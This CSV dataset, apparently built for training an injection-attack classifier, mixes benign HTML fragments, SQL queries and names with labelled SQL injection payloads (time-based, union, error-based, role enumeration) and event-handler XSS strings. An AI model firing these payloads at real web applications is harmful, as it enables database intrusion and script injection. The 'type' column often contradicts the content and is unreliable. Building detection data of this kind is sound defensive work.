Text,Label,type
"	 </span> <span class=""reference-text"">",0,xss
"<dt><a class=""reference internal"" href=""topics/loaders.html""><span class=""doc"">Item Loaders",0,xss
"<li><a href=""/wiki/Jay_Wright_Forrester"" title=""Jay Wright Forrester"">Jay Wright Forrester </a> </li>",0,xss
1%'   )    )     )   rlike   (  select   (  case when   (  7697  =  3334  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',1,sql
select sleep  (  5  )   and   (  1435  =  1435,1,sql
spaeth@directoriogratuito.kr,0,sql
DELETE FROM scientific,0,sql
"<menu draggable=""true"" ondragstart=""alert(1)"">test</menu>",2,xss
SELECT cup FROM last UNION SELECT stay FROM soap ORDER BY outside,0,sql
<nobr onpointerdown=alert(1)>XSS</nobr>,2,xss
6105,0,sql
SELECT look ( s )  FROM service SELECT remember FROM surface,0,sql
" SELECT column_name ( s )  FROM sky,worth",0,sql
1' and 4595  =  4595#,1,sql
SELECT * FROM some,0,sql
"1 union all select null,null,null,null#",1,sql
"-2216   )    )    as hxmq where 5677  =  5677 union all select 5677,5677--",1,sql
SELECT TOP 3 * FROM movie WHERE art = 'shop' SELECT * FROM wish,0,sql
SELECT * FROM satellites FETCH FIRST 3 ROWS ONLY,0,sql
adoree-halsted1@estoespresto.af,0,sql
"  SELECT DAYNAME ( ""2017-06-15"" ) ;",0,sql
"<li><a href=""/wiki/Evolutionary_data_mining"" title=""Evolutionary data mining"">Evolutionary data mining </a> </li>",0,xss
UEf,1,sql
29127,0,sql
"<ul><li><a href=""/wiki/Neurophenomenology"" title=""Neurophenomenology"">Neurophenomenology </a> </li> </ul> </li>",0,xss
"   SELECT wonder, invented, report FROM material WHERE stream  IS NULL",0,sql
select   (  case when   (  4061  =  1396  )   then 4061 else 1/  (  select 0  )   end  )  --,1,xss
SELECT * FROM captured FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM arrange,0,sql
9.84is22nte334c799,0,sql
1%'   )    )    waitfor delay '0:0:5' and    (    (   '%'  =  ',1,sql
"   SELECT Employees.lift, COUNT ( Orders.speechID )  AS potatoesFROM    ( OrdersINNER JOIN paper ON Orders.nervousID  =  Employees.primitiveID ) ",0,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 13278 )  ORDER BY meta_id ASC",0,xss
"1'||  (  select 'dpje' where 2704  =  2704 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",1,xss
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1,sql
<body onwheel=alert(1)>,2,xss
"   SELECT cattle, post, sidesFROM breathing WHERE tropical  IS NOT NULL",0,sql
"<html onkeypress=""alert(1)"" contenteditable>test</html>",2,xss
8169,0,xss
"INSERT INTO brown ( sun, pleasant, society, planet, back, behavior )  VALUES  ( 'trick', 'stared'. level', 'certainly', 'hair', 'fair', 'certainly' )  ",0,sql
"  SELECT Orders.circlerID, Employees.diameter, Employees.automobile FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.shoulderID ORDER BY Orders.shallID",0,sql
SELECT stared ( s )  FROM swung UNION,0,sql
alabiada,0,sql
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;27, 32–58, 968–972 </li>",0,xss
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'pehq' like 'pehq,1,sql
"<bgsound onmousemove=""alert(1)"">test</bgsound>",2,xss
<head onpointermove=alert(1)>XSS</head>,2,xss
SELECT COUNT ( placeID ) FROM right,0,sql
"-6942'  )   union all select 7280,7280,7280#",1,sql
7395,0,sql
"<td onmouseup=""alert(1)"">test</td>",2,xss
combos,0,sql
SELECT * FROM  ( SELECT bet FROM orange ) ,0,xss
"SELECT MONTHNAME ( ""2017-06-15 09:34:21"" ) ;",0,sql
recabdador,0,sql
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'opyt'  =  'opyt",1,sql
"1%'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
SELECT * FROM seven WHERE put BETWEEN 'constantly' AND 'effort',0,sql
"-7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo",1,sql
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""rtyu"" like ""rtyu",1,sql
"<ul onmouseleave=""alert(1)"">test</ul>",2,xss
"  SELECT shutID AS ID, canal AS pile FROM bit",0,sql
1' where 9583  =  9583 and 5319  =  7670#,1,sql
SELECT * FROM  ( SELECT political FROM declared ) ,0,sql
sempere,0,xss
"  SELECT * FROM nothing WHERE find NOT IN  ( 'power', 'football', 'soon' )  ",0,sql
"<mark onbeforecut=""alert(1)"" contenteditable>test</mark>",2,xss
1'  )   where 3311  =  3311,1,sql
"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",1,sql
francina,0,sql
50422961s,0,sql
SELECT * FROM found WHERE ride BETWEEN '1996-07-01' AND '1996-07-31',0,sql
donaldo,0,sql
SELECT * FROM tone WHERE several BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"	 </span> <span class=""reference-text""><a rel=""nofollow"" class=""external text"" href=""https://www.academia.edu/2475776/Versatile_question_answering_systems_seeing_in_synthesis"">""Versatile question answering systems: seeing in synthesis"" </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160201125047/http://www.academia.edu/2475776/Versatile_question_answering_systems_seeing_in_synthesis"">Archived </a> 1 February 2016 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a>, Mittal et al., IJIIDS, 5(2), 119–142, 2011 ",0,xss
<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>,2,xss
77714009e,0,sql
"calle gibraltar, 88",0,sql
"<h1 onmouseup=""alert(1)"">test</h1>",2,xss
SELECT * FROM choose WHERE    NOT courage = 'animal',0,sql
"1%' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and '%'  =  '",1,sql
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'mfib'  =  'mfib",1,sql
"<dialog onkeypress=""alert(1)"" contenteditable>test</dialog>",2,xss
1'  )   waitfor delay '0:0:5',1,sql
"<a href=""/wiki/State_space_search"" title=""State space search"">State space search </a> and <a href=""/wiki/Automated_planning_and_scheduling"" title=""Automated planning and scheduling"">planning </a>:",0,xss
<rtc id=x tabindex=1 onfocus=alert(1)></rtc>,2,xss
"1""  )   as firv where 4522  =  4522 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,xss
-8513' union all select 7414--,1,sql
SELECT * FROM doing ORDER BY week DESC,0,sql
SELECT easily FROM even,0,xss
"<param onbeforepaste=""alert(1)"" contenteditable>test</param>",2,xss
grace,0,sql
"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",1,sql
"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",1,sql
"INSERT INTO bark  ( triangle, due, potatoes )  VALUES  ( 'felt', 'graph', 'beside' )  ",0,sql
"calle reina violante, 35,",0,sql
1'+  (  select 'toec' where 5810  =  5810 and sleep  (  5   )    )   +',1,xss
"calle 300 al 8 del km. 1 puesta en riego 144,",0,sql
"<cite oncut=""alert(1)"" contenteditable>test</cite>",2,xss
"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--",1,sql
"<div draggable=""true"" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>",2,xss
-6100'  )   as kvfc where 2377  =  2377 or 6872  =  6872--,1,sql
"1""  )   where 4172  =  4172 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,sql
	 </span>,0,xss
SELECT * FROM brave WHERE thread = 'fully' FETCH FIRST 3 ROWS ONLY,0,sql
"<IMG onmouseover=""alert('xxs')"">",2,xss
lugar grela 152 1?f,0,xss
<main onblur=alert(1) tabindex=1 id=x></main><input autofocus>,2,xss
cortada mercader,0,sql
SELECT * FROM north,0,sql
"1'   )    )    as bsvk where 5985  =  5985 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,sql
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'bxjo' like 'bxjo",1,xss
"<figure draggable=""true"" ondragstart=""alert(1)"">test</figure>",2,xss
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'gfln'  =  'gfln",1,sql
"<tt oncopy=""alert(1)"" contenteditable>test</tt>",2,xss
SELECT * FROM friendly WHERE possibly = 'interest' FETCH FIRST 3 ROWS ONLY,0,sql
dowser,0,sql
"<menu onmouseenter=""alert(1)"">test</menu>",2,xss
envaronar,0,sql
5498,0,sql
3615,0,xss
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;79–121 </li>",0,xss
	 </span> </li>,0,xss
"1%'   )    )    union all select null,null,null#",1,sql
adashevsky@theroxyblue.com,0,sql
"<li id=""cite_note-232""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-232"">^ </a> </b> ",0,xss
"<style>:target {color: red;}</style><wbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></wbr>",2,xss
alh4a3,0,sql
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,xss
"select pg_sleep  (  5  )   and    (    (     (  ""wqeb""  =  ""wqeb",1,sql
"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qfvg'  =  'qfvg",1,xss
ch9let_a,0,sql
1875,0,sql
SELECT far FROM where UNION ALL SELECT situation FROM sides ORDER BY separate,0,sql
47eg0,0,sql
-3304'   )    )    order by 1--,1,xss
nalia,0,xss
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ajkb'  =  'ajkb",1,sql
"	 </span><h2>Basic concepts<a class=""headerlink"" href=""#basic-concepts"" title=""Permalink to this headline"">¶</a></h2>",0,xss
"-1157   )    )    as sxie where 7118  =  7118 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,sql
SELECT * FROM still WHERE    NOT particular = 'sometime',0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262310,262326,262328 )  ORDER BY meta_id ASC",0,xss
<var onpointerout=alert(1)>XSS</var>,2,xss
"<noscript onmousedown=""alert(1)"">test</noscript>",2,xss
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",1,sql
"<details onmouseleave=""alert(1)"">test</details>",2,xss
SELECT TOP 50 PERCENT * FROM decide SELECT * FROM unhappy FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM about,0,sql
SELECT listen ( s )  FROM courage SELECT eaten FROM his,0,sql
1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',1,xss
SELECT furniture FROM ants,0,sql
SELECT * FROM widely WHERE    NOT muscle = 'area',0,xss
;waitfor delay '0:0:__TIME__'--,1,sql
"   SELECT willing, mice, intoFROM hurry WHERE pick  IS NOT NULL",0,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,sql
SELECT * FROM son FETCH FIRST 3 ROWS ONLY,0,sql
fabiano,0,sql
SELECT too FROM particularly UNION ALL SELECT bit FROM plan ORDER BY nature,0,sql
"1' where 2202  =  2202 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367654 ) ,0,sql
"<embed onbeforepaste=""alert(1)"" contenteditable>test</embed>",2,xss
"<style>:target {color:red;}</style><map id=x style=""transition:color 1s"" ontransitionend=alert(1)></map>",2,xss
alexiana,0,sql
l1am217r5,0,sql
<dd onpointerout=alert(1)>XSS</dd>,2,xss
 </li>,0,xss
SELECT * FROM fifteen WHERE using = 'baby' LIMIT 3,0,sql
"1'   )    )     )   union all select null,null,null,null,null,null#",1,sql
"<kbd draggable=""true"" ondragend=""alert(1)"">test</kbd>",2,xss
"  SELECT ourselves,lack FROM lose WHERE history = 'asleep' UNION SELECT bill, stood FROM terrible",0,sql
"   SELECT instrument, month+ ', ' + brought+ ' ' + rest+ ', ' + yourself AS slipped  FROM nodded",0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""news.html"">Release notes</a></li>",0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"   SELECT strength, fox, pencil FROM trace WHERE hit  IS NULL",0,sql
"<div class=""reflist columns references-column-width"" style=""-moz-column-width: 30em; -webkit-column-width: 30em; column-width: 30em; list-style-type: decimal;"">",0,xss
"1 union all select null,null,null,null,null--",1,xss
"<li><a href=""/wiki/Glossary_of_areas_of_mathematics"" title=""Glossary of areas of mathematics"">Mathematics </a> </li>",0,xss
"	 </span> <span class=""toctext"">References ",0,xss
"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'ayjb' like 'ayjb",1,sql
"1""   )    )    as fhlg where 1004  =  1004 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1,sql
	 </span>(2009) </li>,0,xss
"  SELECT determine,effect,muscle FROM plates LEFT JOIN Orders ON supper.essentialID =  this.balance ORDER BY coat.zero",0,sql
<link id=x tabindex=1 onactivate=alert(1)></link>,2,xss
"<link rel=""stylesheet"" href=""https://assets.readthedocs.org/static/css/readthedocs-doc-embed.css"" type=""text/css"" />",0,xss
"	 <div style=""padding:0em 0.25em"">",0,xss
"<style>:target {transform: rotate(180deg);}</style><style id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></style>",2,xss
"1'  )   where 6720  =  6720 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
SELECT * FROM citizen WHERE game NOT LIKE '[task]%',0,sql
SELECT * FROM itself FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<strike oncut=""alert(1)"" contenteditable>test</strike>",2,xss
SELECT CEIL ( 25 ) ;,0,sql
eward,0,xss
"<noframes onpaste=""alert(1)"" contenteditable>test</noframes>",2,xss
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",1,xss
"   SELECT pool, thick, relationship FROM motion WHERE stock  IS NULL",0,sql
"-5732'  )   union all select 7614,7614,7614,7614--",1,xss
SELECT TOP 50 PERCENT * FROM wait SELECT * FROM eight FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM present,0,sql
torre-pacheco,0,sql
"alqueria de coca 38,",0,xss
"-5160'  )   as kgjw where 9609  =  9609 union all select 9609,9609--",1,sql
aleandro-hayman@tecnoindomo.nr,0,xss
cuarentona,0,sql
"<li><a href=""/wiki/Software_repository"" title=""Software repository"">Software repository </a> </li> </ul>",0,xss
SELECT last ( s )  FROM bank UNION ALL,0,xss
"<style onbeforecut=""alert(1)"" contenteditable>test</style>",2,xss
"  SELECT Orders.platesrID, Employees.sister, Employees.round FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.inID ORDER BY Orders.aliveID",0,sql
SELECT * FROM sun WHERE swimming = 'material' FETCH FIRST 3 ROWS ONLY,0,sql
"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",1,xss
SELECT * FROM  ( SELECT locate FROM root ) ,0,xss
"<link onmouseleave=""alert(1)"">test</link>",2,xss
	 </span>,0,xss
SELECT AVG ( Price ) FROM beyond,0,sql
<meter onpointermove=alert(1)>XSS</meter>,2,xss
"  SELECT longID AS ID, sides AS audience FROM cutting",0,sql
"1'   )    )     )   union all select null,null,null#",1,sql
"<a draggable=""true"" ondrag=""alert(1)"">test</a>",2,xss
4176,0,xss
1'   )    )    and 2832  =  4165--,1,sql
"1%""   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,1,sql
"1%' union all select null,null,null,null,null,null,null,null#",1,xss
"   SELECT late, dozen+ ', ' + rapidly+ ' ' + thumb+ ', ' + radio AS teeth  FROM develop",0,sql
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""%""  =  """,1,sql
minas de riotinto,0,sql
buch als,0,sql
SELECT wait FROM such,0,sql
"1'+  (  select syrz where 7699  =  7699 union all select null,null,null#",1,xss
magnin_arne@tiebreak.com.sr,0,sql
SELECT EXP ( 2 ) ;,0,xss
"1""  )   and elt  (  1889  =  7397,7397  )   and   (  ""kuau""  =  ""kuau",1,xss
"1%' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",1,sql
"          <dd><a href=""/en/0.20/"">0.20</a></dd>       ",0,xss
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'gxgi'  =  'gxgi",1,sql
"   SELECT growth, ought, finishFROM serve WHERE phrase  IS NOT NULL",0,sql
1'  )   where 3636  =  3636 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,sql
